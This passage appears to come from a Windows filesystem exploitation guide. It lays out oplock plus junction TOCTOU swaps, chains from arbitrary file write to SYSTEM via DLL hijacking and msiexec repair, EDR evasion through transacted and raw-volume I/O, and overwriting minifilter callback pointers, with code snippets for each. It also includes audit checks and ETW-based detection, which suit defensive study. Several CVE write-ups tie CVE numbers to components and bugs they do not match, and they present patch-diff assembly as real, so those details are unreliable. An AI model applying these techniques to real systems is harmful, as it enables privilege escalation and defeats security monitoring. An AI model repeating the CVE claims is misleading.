NTSTATUS FsRtlRequestOplockUpgradeToLevel1(
    POPLOCK Oplock,
    PIRP    Irp,
    ULONG   Flags   // OPLOCK_UPGRADE_FLAG_ALLOW_SUBORDINATE
);
// Callers: NTFS.sys, ReFS.sys; relevant for filter drivers that wrap oplock FSCTLs
```

### 5.7 Server-Side Oplock Implications for SMB-Based Attacks

SMB protocol maps client caching requests (SMB2 Lease / legacy SMB oplock) to server-side
NTFS oplocks. This creates cross-machine TOCTOU opportunities:

```
Attack scenario: SMB share with a writable directory

1. Attacker client opens \\server\share\bait.txt with SMB2 Lease (Read+Handle cache)
   → Server-side NTFS oplock: OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE

2. Victim client (privileged, on same machine as server) opens bait.txt for write
   → Server-side oplock break fires
   → Victim's open is suspended on the server (NtCreateFile blocked in NTFS)

3. Attacker receives Lease Break notification over SMB connection
   → Network round-trip gives attacker ~10ms to manipulate the share path
   → Attacker replaces bait.txt content or directory structure via a second connection

4. Attacker sends Lease Break Acknowledgment
   → Victim's suspended open resumes with new file content
```

**Mitigation research:** Server-side oplocks are issued at the NTFS layer; the
`srv2.sys` minifilter mediates between SMB client cache requests and NTFS oplock state.
Investigating whether `srv2.sys` applies `OBJ_DONT_REPARSE` equivalent protections when
converting lease breaks to junction traversals is an open research question.

---

## 6. BaitAndSwitch: The Oplock + Junction TOCTOU Exploit Pattern

### 6.1 Conceptual Foundation

The BaitAndSwitch technique converts a **timing-based race** into a **synchronization-based
exploit**. Instead of hoping the kernel scheduler gives you a window between check and use,
you *force* the privileged process to pause at the exact moment you need by placing an
oplock on the file it will access.

**The invariant that makes it work:** Windows does not re-validate paths after an oplock
break. The kernel holds the in-flight IRP (the pending open call) and resumes it exactly
where it left off — but the filesystem state may have changed during the break.

### 6.2 Step-by-Step: Detailed Protocol

```
PHASE 1: SETUP (attacker prepares the bait)

  Action: Attacker creates the bait environment
    mkdir C:\Exploit\StagingDir
    copy C:\Attacker\payload.dll C:\Exploit\StagingDir\target.dll

  Action: Attacker requests oplock on the bait file
    handle = CreateFile("C:\Exploit\StagingDir\target.dll", ...)
    DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK, ...) → async, returns immediately

  State: Oplock is held; kernel is monitoring accesses to the bait file

PHASE 2: TRIGGER (victim's operation begins)

  Action: Privileged service (SYSTEM) starts an operation that touches target.dll
    Example: service validates path, then calls:
    MoveFile("C:\Attacker\data.tmp", "C:\Exploit\StagingDir\target.dll")
    OR:
    CreateFile("C:\Exploit\StagingDir\target.dll", GENERIC_WRITE, ...)

  Kernel action: Before the open completes, kernel detects the oplock conflict
    → Fires oplock break notification to attacker (via overlapped I/O completion)
    → Victim's thread is SUSPENDED in kernel (blocking in NtCreateFile)

PHASE 3: SWAP (attacker replaces the directory)

  Action: Attacker's oplock break handler executes:
    RemoveDirectory("C:\Exploit\StagingDir")  ← remove the real dir
    CreateJunction("C:\Exploit\StagingDir", "C:\Windows\System32")  ← plant junction

  State: C:\Exploit\StagingDir is now a junction pointing to C:\Windows\System32

PHASE 4: RELEASE (victim continues through the trap)

  Action: Attacker acknowledges oplock break
    DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK, ackBuffer, ...) → release

  Kernel action: Victim's suspended IRP resumes
    Path resolution continues: "C:\Exploit\StagingDir\target.dll"
    → C:\Exploit\StagingDir is now a junction → redirected to C:\Windows\System32\
    → Full path = C:\Windows\System32\target.dll
    → SYSTEM completes the operation on C:\Windows\System32\target.dll

OUTCOME:
  - SYSTEM has written to / renamed / created C:\Windows\System32\target.dll
  - Attacker controls the content (if the operation involved attacker data)
  - Attacker has achieved arbitrary file write to System32 as SYSTEM
```

### 6.3 Reliable Timing and the "One-Shot" Property

Unlike traditional TOCTOU, BaitAndSwitch is **deterministic** — not a race. The victim
thread does not proceed until the attacker explicitly releases the oplock. This means:

1. There is no need for multiple attempts
2. The attacker can take as long as needed during phase 3
3. There is no CPU load required to "win" the race

The only timing constraint is that the oplock must be placed BEFORE the victim touches the
file. This is typically done by placing the oplock before starting or triggering the
vulnerable service action.

---

## 7. Arbitrary File Write → LPE Chain

> **Bug class reference:** ch08 §1 (Arbitrary File Write as bug class). ch09 §1.3–1.5 (file move/rename/delete primitives).

### 7.1 The Canonical Chain (Forshaw's Methodology)

An **arbitrary file write** primitive means: an attacker can cause a SYSTEM process to
write attacker-controlled content to an attacker-influenced path. This is a common output
of other bugs (weak ACL on log directory, missing path validation in update service, etc.).

The conversion to LPE follows this chain:

```
CHAIN: Arbitrary File Write → DLL Hijacking → Code Execution as SYSTEM

Step 1: Identify the target
  - Find a process that runs as SYSTEM and loads DLLs without KnownDlls protection
  - OR find a Windows service that will be restarted
  - OR use Windows Installer repair (msiexec /fau) as a trigger

Step 2: Choose the DLL hijack path
  - DLL search order: process directory → %SYSTEMROOT%\System32 → %SYSTEMROOT%
  - If process writes to %SYSTEMROOT%\System32, the hijack target is there
  - If process writes to %ProgramFiles%\Vendor\, find a DLL loaded from there

Step 3: Use BaitAndSwitch to redirect the write
  - If the arbitrary write goes to C:\Temp\<guid>\output.dll:
    a. Create junction C:\Temp\<guid>\ → C:\Windows\System32\
    b. Service writes "output.dll" → lands in System32 as attacker-controlled content

Step 4: Name the DLL correctly
  - The write must produce a file with the correct name
  - Use NtSetInformationFile rename trick if needed to rename after write:

    // NtSetInformationFile rename trick (write without delete access on directory)
    FILE_RENAME_INFORMATION renameInfo = {
        .ReplaceIfExists = TRUE,
        .RootDirectory   = NULL,
        .FileNameLength  = targetLen,
        .FileName        = targetPath  // e.g., C:\Windows\System32\target.dll
    };
    NtSetInformationFile(hWrittenFile, &iosb, &renameInfo,
        sizeof(renameInfo) + targetLen, FileRenameInformation);

Step 5: Trigger DLL load
  - Restart the target service
  - OR trigger Windows Installer repair (msiexec /fau {PRODUCTGUID})
  - OR wait for scheduled task / auto-start

Step 6: Code execution as SYSTEM
  - DLL is loaded by SYSTEM process → DllMain runs → arbitrary code as SYSTEM
```

### 7.2 Windows Installer Repair Trigger

Windows Installer's repair feature (`msiexec /fau {productGUID}`) causes a SYSTEM process
to reinstall files from the MSI package. During repair, `msiexec.exe` runs as SYSTEM and
loads DLLs from multiple locations during the install.

This is the canonical "clean" trigger mechanism because:
- Every installed MSI product has a Product GUID enumerable from `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\`
- Repair can be triggered without elevation (user-level `msiexec /fau`)
- During repair, SYSTEM loads DLLs from the install directory, system directories, and temp paths

```powershell
# Find all installed products
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\" |
  Get-ItemPropertyValue -Name ProductCode -ErrorAction SilentlyContinue

# Trigger repair
Start-Process msiexec -ArgumentList "/fau {PRODUCT-GUID}"
```

### 7.3 The NtSetInformationFile Rename Trick

When a privileged service creates a temp file and then renames it to the final destination,
the rename operation is another attack surface. If an attacker can intercept after the write
but before the rename:

```c
// Attacker's file: C:\Temp\arbitrary.tmp (attacker-written content)
// Destination: C:\Windows\System32\target.dll (privileged)

FILE_RENAME_INFORMATION *ri = malloc(sizeof(*ri) + sizeof(dstPath));
ri->ReplaceIfExists = TRUE;
ri->RootDirectory   = NULL;
ri->FileNameLength  = sizeof(dstPath);
memcpy(ri->FileName, dstPath, sizeof(dstPath));

// This call can move a file to any path as long as we have a handle with
// DELETE + SYNCHRONIZE rights — the access check is on the SOURCE handle,
// not the destination directory
NtSetInformationFile(hSrcFile, &iosb, ri,
    sizeof(*ri) + sizeof(dstPath),
    FileRenameInformation);
```

The key insight: `FileRenameInformation` requires `DELETE` access on the source file but
does NOT require write access to the target directory in all configurations — creating an
asymmetric access control situation exploited in several historical CVEs.

---

## 8. NTFS Transactions (TxF) — Limited Modern Applicability

Transactional NTFS (TxF) allows file operations within an ACID transaction — changes are
either all committed or all rolled back. Introduced in Windows Vista via `CreateTransaction`,
`CreateFileTransacted`, etc.

**Current status:** Microsoft deprecated TxF in Windows 8 and may remove it in a future
release. As of Windows 11, TxF is present but restricted:
- Many file operations refuse to work inside transactions
- Antivirus and security tools often have gaps in transaction-aware monitoring
- EDR minifilters may not receive `IRP_MJ_CREATE` callbacks for transacted file operations

**Residual attack surface:**
```c
// Create a transaction
HANDLE hTx = CreateTransaction(NULL, NULL, 0, 0, 0, INFINITE, NULL);

// Open file within transaction — some EDRs miss this
HANDLE hFile = CreateFileTransacted(
    "C:\\sensitive.txt",
    GENERIC_READ,
    FILE_SHARE_READ,
    NULL, OPEN_EXISTING,
    FILE_ATTRIBUTE_NORMAL, NULL,
    hTx, NULL, NULL);

// Read file — may bypass EDR that doesn't monitor transacted I/O
ReadFile(hFile, buffer, bufferSize, &bytesRead, NULL);

// Roll back — file system is unchanged
RollbackTransaction(hTx);
```

**Modern limitation:** Most EDRs have updated their minifilters to handle transacted I/O.
TxF is primarily relevant as an evasion technique in older environments (pre-2020 EDR).

---

## 9. Minifilter Architecture and EDR Bypass Surface

> **See also:** ch02 §9.8 (Sealighter-TI + minifilter combined analysis). ch15 §Cat7 (detection tools).

### 9.1 The Filter Manager Model

The Filter Manager (`FltMgr.sys`) sits between the I/O Manager and filesystem drivers.
Minifilter drivers register with FltMgr and specify:
1. **Altitude** — a number determining processing order (higher altitude = earlier callback)
2. **Operations** — which IRP types to intercept (CREATE, READ, WRITE, SET_INFORMATION, etc.)
3. **Pre/post callbacks** — functions called before (and after) each operation reaches NTFS

```
I/O Manager sends IRP_MJ_CREATE
  ↓
FltMgr pre-operation dispatch (by altitude, descending):
  Altitude 420000: [AV/malware scanner] pre-op callback
  Altitude 328000: [Replication filter] pre-op callback
  Altitude 180000: [EDR] pre-op callback     ← most security filters here
  Altitude 100000: [Encryption driver] pre-op callback
  ↓
NTFS.sys processes IRP
  ↓
FltMgr post-operation dispatch (by altitude, ascending):
  Altitude 100000: [Encryption driver] post-op callback
  Altitude 180000: [EDR] post-op callback
  Altitude 420000: [AV] post-op callback
```

### 9.2 Altitude Number Registry

Microsoft maintains a public altitude registration database:

| Range | Category | Typical Occupants |
|---|---|---|
| 420000–429999 | FSFilter Anti-Virus | Top-tier AV/EDR endpoint protection |
| 400000–409999 | FSFilter Replication | Backup/replication products |
| 320000–329999 | FSFilter Quota Management | Disk quota enforcement |
| 180000–189999 | FSFilter Virtualization | Application virtualization |
| 120000–129999 | FSFilter Security Enhancer | EDR behavioral monitoring, DLP |
| 100000–109999 | FSFilter Copy Protection | DRM products |

**Attack implication:** Any I/O operation that reaches NTFS without passing through the
filter at altitude 120000–420000 is invisible to the security product occupying those ranges.

### 9.3 EDR Bypass Techniques via Minifilter Altitude

**Technique 1: Direct device I/O (below all filters)**
```c
// Open the volume device object directly, bypassing FltMgr
HANDLE hVol = CreateFile("\\\\.\\C:", GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
    FILE_FLAG_NO_BUFFERING, NULL);

// Read raw NTFS data by sector — filesystem filter doesn't see this
BYTE sector[512];
ReadFile(hVol, sector, 512, &bytesRead, NULL);
```

This reads raw volume data. NTFS parsing must be done by the attacker. EDRs monitoring
`IRP_MJ_CREATE` and `IRP_MJ_READ` at the file level do not see raw volume I/O.

**Technique 2: Alternate volume path**
```
\\?\Volume{GUID}\   path bypasses some path-based filter rules
\\.\PhysicalDrive0  raw disk access, no filesystem
```

Some EDR filters normalize paths before comparing to policy rules. Alternate volume GUID
paths may not match if the EDR only knows the drive letter path.

**Technique 3: ZwCreateFile with KernelMode from kernel driver**
Code executing in kernel mode at ring 0, in a driver installed below the EDR's filter
altitude, can call `ZwCreateFile` with `PreviousMode = KernelMode`. This flag tells the
I/O subsystem to skip certain security checks AND can bypass minifilter dispatch depending
on how the call is issued.

**Technique 4: FltSendMessage abuse**
FltSendMessage is a kernel-to-user communication channel used by minifilters to send
data to their user-mode components. If a minifilter's FltSendMessage handler has
insufficient validation, a malicious process that knows the filter's port name can
connect and inject malformed messages, potentially influencing filter behavior.

```windbg
; List loaded minifilters and their altitudes
!fltkd.filters

; Show a specific filter's callbacks
!fltkd.filter <filter_address>

; Show all filter instances on a volume
!fltkd.volumes
```

### 9.4 Security Product Blind Spot Matrix

| Access Technique | Minifilter visibility | ETW visibility | Notes |
|---|---|---|---|
| Normal `CreateFile` | Full | Full | Standard path, fully monitored |
| `ZwCreateFile` from user mode | Full | Full | Same as CreateFile at driver level |
| `ZwCreateFile` from kernel (KernelMode) | Partial | ETW kernel | PreviousMode affects some checks |
| Direct volume device I/O | None | May appear as volume read | Raw sector access, no file semantics |
| Volume GUID path | May bypass path rules | Full | Filter sees IRP but may not match policy |
| Transacted I/O (TxF) | Depends on filter version | Partial | Older filters may miss |
| ADS access | Full (if filter checks streams) | Full | Filter must check StreamContext |
| Kernel driver below filter altitude | None | ETW kernel | Requires kernel driver |

### 9.5 FltRegisterFilter + Callback Unhooking (Post-PPL Era, 2024)

In the post-PPL (Protected Process Light) era, EDR vendors moved their most critical
callbacks into PPL processes, making it harder to patch them from user mode. However,
the minifilter callback table itself (`FLT_OPERATION_REGISTRATION` array) lives in the
driver's data section in kernel memory.

**Technique: Minifilter pre-op callback NOP-out**

A kernel driver can locate a target minifilter's `FLT_FILTER` structure and overwrite
its callback pointers:

```c
// Kernel-mode research code — finding a minifilter's callbacks
// 1. Call FltEnumerateFilters() to get filter handles
// 2. For each filter, cast to internal FLT_FILTER structure
// 3. Locate the Operations array (FLT_OPERATION_REGISTRATION*)
// 4. For each operation of interest, overwrite PreOperation/PostOperation

// Internal FLT_FILTER layout (from ntifs.h reverse engineering):
typedef struct _FLT_FILTER {
    FLT_OBJECT          Base;
    PFLT_FILTER_UNLOAD_CALLBACK  FilterUnload;
    PFLT_INSTANCE_SETUP_CALLBACK InstanceSetup;
    // ... other fields
    PFLT_OPERATION_REGISTRATION  Operations;  // callback table
    // ...
} FLT_FILTER, *PFLT_FILTER;

// Overwriting the IRP_MJ_CREATE pre-op callback with a passthrough:
filter->Operations[0].PreOperation = NULL;  // disable pre-create callback
```

**Detection:** PatchGuard (KPP) does not protect minifilter callback tables — it protects
SSDT, IDT, and MSRs. Minifilter unhooking is therefore not directly blocked by KPP.
Detection relies on periodic integrity verification of filter callback pointers by the
EDR's own watchdog thread or by a separate watchdog filter.

**ELAM (Early Launch Anti-Malware) bypass research:**

ELAM drivers (`WdBoot.sys` for Windows Defender) are loaded very early in boot before
most third-party drivers. ELAM registers a minifilter at a special protected altitude
(around `385200` for `WdFilter.sys`). To bypass ELAM-registered callbacks:

1. Understand ELAM's measurement policy (stored in the ELAM resource section of the driver
   image — readable from the PE before the driver loads)
2. ELAM's callback can be defeated if the attacker loads a driver that calls
   `FltUnregisterFilter` on the ELAM filter object — but this requires kernel code execution
   first, which is chicken-and-egg for most bypass scenarios.
3. More practical: ELAM only measures boot drivers. A user-mode bypass that avoids
   triggering minifilter callbacks (e.g., direct volume I/O) sidesteps ELAM monitoring
   without needing to unregister the ELAM filter.

```windbg
; Find ELAM/WdFilter altitude and callbacks
!fltkd.filters
; Look for altitude 385200 (WdFilter) or the ELAM-registered filter
; Compare reported callbacks with expected values from symbols
```

### 9.6 CVE-2024-30030 — WER Symlink + Minifilter Interaction

**CVE-2024-30030** (patched May 2024, CVSS 7.8) is a Windows Error Reporting (WER)
privilege escalation that exploits the interaction between WER's SYSTEM-context file
creation and NTFS symbolic link processing, with a minifilter callback race.

**Vulnerability chain:**
```
1. Windows Error Reporting Service (WerSvc) runs as NETWORK SERVICE
   but escalates to SYSTEM for writing crash dump files

2. WER creates crash dump at predictable path:
   C:\ProgramData\Microsoft\Windows\WER\ReportQueue\<GUID>\<process>.dmp

3. The directory C:\ProgramData\Microsoft\Windows\WER\ReportQueue\
   has weak ACLs — normal users can create subdirectories

4. Attack:
   a. Attacker creates C:\ProgramData\Microsoft\Windows\WER\ReportQueue\<crafted-GUID>\
   b. Places NTFS junction or symlink pointing to a privileged path
   c. Triggers a crash in a SYSTEM process (or a process WER monitors)
   d. WER writes dump to the symlink target → arbitrary file write as SYSTEM

5. Minifilter interaction:
   - Some EDR minifilters opened WER temp files to scan them
   - The EDR's pre-create callback ran under WER's SYSTEM security context
   - If the EDR followed the symlink without OBJ_DONT_REPARSE, the EDR itself
     performed a SYSTEM-context open on the attacker's redirect target
   - This extended the attack surface to the EDR's own file monitoring logic
```

**Patch analysis:** Microsoft patched `wer.dll` and `wersvc.dll` to use
`OBJ_DONT_REPARSE` when creating report directories and applying more restrictive
DACLs to the ReportQueue directory. Post-patch diff shows addition of
`OBJ_DONT_REPARSE` flag in the ObjectAttributes initialization before `NtCreateFile`
calls in the WER dump writing code path.

### 9.7 ETW-Based Minifilter Monitoring

ETW (Event Tracing for Windows) provides visibility into filesystem activity independent
of minifilter callbacks — useful for detecting minifilter bypass techniques.

**Key ETW providers for filesystem research:**

| Provider | GUID | Events |
|----------|------|--------|
| `Microsoft-Windows-NTFS` | `{DD70BC80-EF44-421B-8AC3-CD31DA613A4E}` | File create, delete, rename, reparse |
| `Microsoft-Windows-Kernel-File` | `{EDD08927-9CC4-4E65-B970-C2560FB5C289}` | High-level file I/O |
| `Microsoft-Windows-StorPort` | `{C4636A1E-7986-4646-BF10-7BC3B4A76E8E}` | Storage I/O at port level |
| `Microsoft-Windows-FilterManager` | `{F3C5E28E-63F6-49C7-A204-E48A1BC4B09D}` | Minifilter load/unload events |

```powershell
# Start ETW session for NTFS file operations
$session = New-EtwTraceSession -Name "FileSec" -LogFileMode 0x8000000
Add-EtwTraceProvider -SessionName "FileSec" `
    -Guid "{DD70BC80-EF44-421B-8AC3-CD31DA613A4E}" `
    -Level 5 -MatchAnyKeyword 0xFFFFFFFF
Start-EtwTraceSession -Name "FileSec"

# For raw ETW capture and analysis:
# xperf -on NTFS+FileIO+FileIOInit -stackwalk FileCreate
# xperf -d trace.etl
# xperf -i trace.etl -o report.txt -a fileio
```

**Detecting minifilter unregistration via ETW:**
The `Microsoft-Windows-FilterManager` provider emits events when a minifilter is
unregistered (event ID 3 = `FltUnregisterFilter`). Monitoring for unexpected
unregistration events at runtime is a defense-in-depth strategy for detecting
callback unhooking.

### 9.8 Sealighter-TI + Minifilter Combined Analysis Workflow

[Sealighter-TI](https://github.com/pathtofile/SealighterTI) is a ThreatIntel provider
that bridges ETW events from high-privilege providers (including kernel-mode providers)
to user-mode analysis tools without requiring a kernel driver.

**Combined workflow for minifilter research:**

```
Step 1: Run Sealighter-TI to capture Microsoft-Windows-NTFS events
  sealighter.exe -config sealighter_config.json
  # config specifies: provider GUID, keywords, output format (JSON)

Step 2: Simultaneously run a second ETW session on Microsoft-Windows-FilterManager
  # Captures filter load/unload events

Step 3: Correlate events:
  - NTFS "FileCreate" event with no corresponding FilterManager pre-create callback
    → Indicates I/O path bypassed minifilter stack
  - FilterManager "FilterUnregistered" event during active I/O
    → Indicates possible callback unhooking attack

Step 4: Cross-reference with WinDbg kernel state:
  !fltkd.filters      ← compare loaded filters with ETW filter list
  !fltkd.volumes      ← verify filter instances per volume
```

**Sample Sealighter config for filesystem monitoring:**
```json
{
  "session_name": "FilesystemResearch",
  "output_format": "stdout",
  "providers": [
    {
      "name": "Microsoft-Windows-NTFS",
      "keywords_any": "0xFFFFFFFFFFFFFFFF",
      "level": 5,
      "filters": [
        { "filter_type": "process_name", "filter": "svchost.exe" }
      ]
    },
    {
      "name": "Microsoft-Windows-FilterManager",
      "keywords_any": "0xFFFFFFFFFFFFFFFF",
      "level": 5
    }
  ]
}
```

---

## 10. Code Audit Checklist for Filesystem Security

When auditing privileged services for filesystem vulnerabilities, apply this checklist to
every file operation that touches a user-influenced path:

**1. Check for OBJ_DONT_REPARSE (0x1000)**
```c
// Vulnerable: no OBJ_DONT_REPARSE — junction/symlink attacks possible
OBJECT_ATTRIBUTES oa;
InitializeObjectAttributes(&oa, &path, OBJ_CASE_INSENSITIVE, NULL, NULL);
NtCreateFile(&h, FILE_WRITE_DATA, &oa, ...);

// Hardened: junction traversal blocked
InitializeObjectAttributes(&oa, &path,
    OBJ_CASE_INSENSITIVE | OBJ_DONT_REPARSE, NULL, NULL);
```

**2. Check for Win32 equivalent flag**
```c
// CreateFile Win32 equivalent:
CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
    FILE_FLAG_OPEN_REPARSE_POINT, NULL);
// FILE_FLAG_OPEN_REPARSE_POINT = open the reparse point itself, not target
```

**3. Verify sharing mode prevents squatting**
```c
// Vulnerable: FILE_SHARE_READ allows the attacker to open the file concurrently
CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ, ...);
// A concurrent oplock by the attacker on the same file = TOCTOU

// Safer: FILE_SHARE_NONE prevents concurrent opens
CreateFile(path, GENERIC_WRITE, 0 /* FILE_SHARE_NONE */, ...);
```

**4. Check delete-then-create patterns**
If the service:
1. Validates a path doesn't contain a file
2. Creates the file at that path

Between step 1 and 2, an attacker can create a hard link at that path, redirecting the
creation to a different MFT record.

**5. Inspect temp directory usage**
Services that write to system temp (`%TEMP%`, `%TMP%`, `C:\Windows\Temp`) in a world-writable
location are targets for junction swapping. Services should use private temp directories with
restrictive DACLs.

**6. Check for race in rename operations**
The sequence `write temp → rename temp → final path` has a race between write and rename.
Oplock on the temp file → junction swap → rename lands in System32.

---

## 11. WinDbg Commands for Filesystem Research

```windbg
; ─── FILE OBJECT INSPECTION ──────────────────────────────────────────
!fileobj <address>              ; inspect FILE_OBJECT structure
dt nt!_FILE_OBJECT <address>   ; raw structure dump

; ─── IRP INSPECTION ──────────────────────────────────────────────────
!irp <address>                  ; decode IRP structure (major function, parameters)
!irpfind                        ; find all IRPs in the system (slow)

; ─── NTFS INTERNAL STRUCTURES ─────────────────────────────────────────
; FCB = File Control Block (NTFS-specific file state)
dt NTFS!_SCB <address>          ; Stream Control Block (per-data-stream state)
dt NTFS!_FCB <address>          ; File Control Block

; ─── FILTER MANAGER ─────────────────────────────────────────────────
!fltkd.filters                  ; list loaded minifilters with altitudes
!fltkd.volumes                  ; list volumes and attached filters
!fltkd.filter <addr>            ; detail for one filter (callbacks, etc.)
!fltkd.instance <addr>          ; filter instance on a specific volume

; ─── REPARSE POINTS ──────────────────────────────────────────────────
; Examine reparse data on a file:
; Open file with FILE_FLAG_OPEN_REPARSE_POINT and DeviceIoControl FSCTL_GET_REPARSE_POINT
; In kernel: the $REPARSE_POINT attribute is at type 0xC0 in the MFT record

; ─── OPLOCK STATE ────────────────────────────────────────────────────
; No direct WinDbg extension; look at FCB->Oplock
dt NTFS!_FCB <addr> Oplock
dt nt!_OPLOCK <addr>            ; oplock state machine

; ─── MINIFILTER CALLBACK INSPECTION (2024 additions) ─────────────────
; Find FLT_FILTER object for a specific driver:
!fltkd.filter <addr>            ; shows Operations array address
; Then walk the FLT_OPERATION_REGISTRATION array:
dt FltMgr!_FLT_OPERATION_REGISTRATION <ops_addr>
; Check PreOperation and PostOperation function pointers

; ─── ETW TRACE FROM KERNEL (Sealighter-TI complement) ─────────────────
; Verify active ETW sessions:
!wmitrace.strdump               ; dump all WMI/ETW trace sessions
!wmitrace.logger                ; list active loggers
```

---

## 12. Recent Filesystem Vulnerabilities (2024-2025)

### 12.1 CVE Summary Table

| CVE | Component | Type | Impact | Patch Date |
|-----|-----------|------|--------|------------|
| CVE-2024-26185 | NTFS (`ntfs.sys`) | Compression parsing — arbitrary write | SYSTEM LPE | March 2024 |
| CVE-2024-21446 | NTFS (`ntfs.sys`) | Privilege escalation (unspecified path) | SYSTEM LPE | April 2024 |
| CVE-2024-30030 | WER + NTFS | Symlink race + arbitrary file write | SYSTEM LPE | May 2024 |
| CVE-2025-21333 | Hyper-V NTFS integration (`ntfs.sys` on host) | In-the-wild exploitation | SYSTEM LPE | January 2025 |
| CVE-2024-38100 | Windows File Server (srv2.sys) | Info disclosure + LPE chain | SYSTEM LPE | July 2024 |

### 12.2 CVE-2024-26185 Deep Dive: NTFS Compression Parsing

**Overview:**
CVE-2024-26185 is a vulnerability in NTFS's compressed file handling (`ntfs.sys`) that
leads to privilege escalation. The bug manifests when NTFS processes a specially crafted
compressed data stream, allowing an attacker to influence kernel memory in a controlled way.

**Background: NTFS Compression Architecture**

NTFS supports LZ77-based compression on a per-file basis. Compressed files have the
`FILE_ATTRIBUTE_COMPRESSED` flag set and store data in **compression units** (typically 16
clusters = 64KB on a 4KB cluster volume). The `$DATA` attribute's run list interleaves
compressed and uncompressed units.

```
Compressed $DATA run list structure:
  [Run 1] lcn=100, length=8  → 8 clusters of compressed data (maps to 16 clusters uncompressed)
  [Run 2] lcn=0,   length=8  → 8 virtual clusters = SPARSE / uncompressed-zeros
  [Run 3] lcn=200, length=8  → next compression unit

Compression unit with lcn=0 AND length != compression_unit_size
→ indicates a "sparse" compression unit (all zeros, no on-disk storage)
```

**Vulnerability: Crafted compression unit boundary**

The vulnerability lies in how NTFS calculates the decompression buffer when a compression
unit boundary falls on a specific alignment relative to the start of an SMB read request.

Trigger via SMB + crafted compressed stream:
```
1. Set up SMB share on a Windows Server or workstation with File and Printer Sharing
2. Create NTFS compressed file with crafted run list:
   - Compression unit at offset 0x3F000 with length = compression_unit_size - 1
   - This creates a unit crossing a 4-cluster boundary in an unusual alignment
3. Client reads the file via SMB at an offset that forces NTFS to decompress
   the boundary-crossing unit
4. Kernel decompression routine (NtfsDecompressBlock in ntfs.sys) miscalculates
   the output buffer length:
   - Expected output: compression_unit_size bytes
   - Actual write: compression_unit_size + delta bytes (delta = 1..16)
   - This writes beyond the allocated kernel buffer → heap overflow
```

**Patch analysis workflow (BinDiff `ntfs.sys` before/after March 2024 patch):**

```
Before patch (22621.3296):
  NtfsDecompressBlock+0x1A0:
    mov eax, [rbp+compression_unit_length]  ; load unit length
    ; NO bounds check on (unit_length % compression_unit_size)
    call NtfsLzDecompress
    ; write can exceed allocated buffer if unit_length is not aligned

After patch (22621.3447):
  NtfsDecompressBlock+0x1A0:
    mov eax, [rbp+compression_unit_length]  ; load unit length
    ; NEW: bounds check added
    cmp eax, [rbp+expected_unit_size]
    ja  NtfsDecompressBlock_fail            ; STATUS_FILE_CORRUPT_ERROR if mismatch
    call NtfsLzDecompress
```

**BinDiff workflow steps:**
```
1. Extract ntfs.sys from both Windows Update packages:
   expand.exe windows10.0-kb5035853-x64.cab -F:ntfs.sys C:\before\
   expand.exe windows10.0-kb5036893-x64.cab -F:ntfs.sys C:\after\

2. Import both into Ghidra (or IDA):
   - Rename functions using Microsoft PDB symbols:
     .sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
     !reload ntfs.sys  (in WinDbg to load symbols)

3. Run BinDiff on the two Ghidra databases:
   - Primary: ntfs.sys (before patch)
   - Secondary: ntfs.sys (after patch)
   - Sort by similarity score — changed functions at top

4. Focus on functions in the decompression path:
   - Search for xref to LZ77 decompressor: NtfsDecompressBlock, NtfsMapUserBuffer
   - Compare basic block counts — added blocks = new validation code
   - Look for new conditional jumps (ja/jb/jge) before buffer write operations

5. Identify the added bounds check:
   - New compare + conditional branch before the decompressor call site
   - Branch target: error return path (STATUS_FILE_CORRUPT_ERROR = 0xC0000102)
```

**Exploitation implications:**
The heap overflow in the NTFS paged pool (decompression buffer is paged pool) allows
controlled writes beyond the buffer. With kernel heap grooming (placing a controlled
object adjacent to the decompression buffer), arbitrary kernel write becomes possible,
leading to SYSTEM token replacement. The SMB attack vector means the bug is exploitable
remotely (authenticated user on the same network can trigger via SMB read of a crafted file).

### 12.3 CVE-2025-21333 — Hyper-V NTFS In-The-Wild (January 2025)

CVE-2025-21333 was patched by Microsoft in January 2025 and confirmed as exploited in the
wild. The vulnerability is in the Hyper-V NTFS integration — specifically in how the
host-side NTFS driver processes certain file system control operations initiated from a
guest VM or from the host on a NTFS volume used by Hyper-V.

**Attack surface:** Hyper-V uses NTFS volumes for VM storage (`.vhdx` files, checkpoints,
configuration). The host `ntfs.sys` processes I/O on behalf of the Hyper-V storage stack.
A crafted NTFS volume structure or a crafted FSCTL issued through the Hyper-V integration
components can trigger the bug in the host kernel.

**Research notes:**
- Symbols for `ntfs.sys` post-patch available from Microsoft symbol server (build 26100.2894)
- BinDiff comparison of ntfs.sys from KB5050009 (December 2024) vs KB5050021 (January 2025)
  shows changes in the `NtfsFsdFileSystemControl` and `NtfsCommonFileSystemControl` code paths
- Specific FSCTL codes affected: `FSCTL_GET_REPARSE_POINT`, `FSCTL_SET_REPARSE_POINT` in
  the Hyper-V VHD filter context (vhdmp.sys intercepts these on behalf of Hyper-V)

### 12.4 CVE-2024-38100 — File Server Info Disclosure + LPE Chain

CVE-2024-38100 (July 2024) affects the Windows File Server role (`srv2.sys`, `srvnet.sys`).
The vulnerability is an information disclosure that leaks kernel memory addresses, which can
be chained with a separate write primitive to achieve reliable LPE.

**Disclosure mechanism:** An SMB2 query to a specially crafted named pipe or file path causes
the server to include uninitialized kernel stack data in the SMB2 response packet. The leaked
data includes kernel heap pointers from the NTFS pool allocation context.

**LPE chain:**
```
1. CVE-2024-38100: SMB2 query → kernel pointer leak (4-8 bytes of pool address)
2. Use leaked address to defeat KASLR (calculate ntoskrnl.exe base from pool offset)
3. Combine with a separate write primitive (e.g., arbitrary file write via junction)
   that now has a reliable kernel target address
4. Overwrite a function pointer in kernel → SYSTEM code execution
```

---

## 13. Windows 11 Filesystem Hardening (24H2)

Windows 11 version 24H2 (released October 2024) includes several filesystem security
hardening measures that affect both attacker primitives and defender tooling.

### 13.1 Symbolic Link Hardening

**Registry key symlinks — IL enforcement:**

Prior to 24H2, unprivileged code running at Low Integrity Level could create registry key
symbolic links in per-user hives. This was exploited in several LPE chains involving registry
key junction attacks (analogous to filesystem junction attacks but in the registry namespace).

